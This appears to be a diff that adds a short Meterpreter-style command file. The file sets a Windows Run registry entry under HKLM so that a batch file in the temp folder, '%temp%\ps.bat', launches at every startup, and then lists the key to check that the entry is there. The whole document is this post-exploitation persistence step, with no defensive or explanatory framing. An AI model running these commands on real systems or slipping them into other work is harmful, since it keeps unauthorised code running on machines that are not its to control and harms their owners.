@@ -1,0 +1,2 @@
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v ps -d '%temp%\ps.bat'
+reg  enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
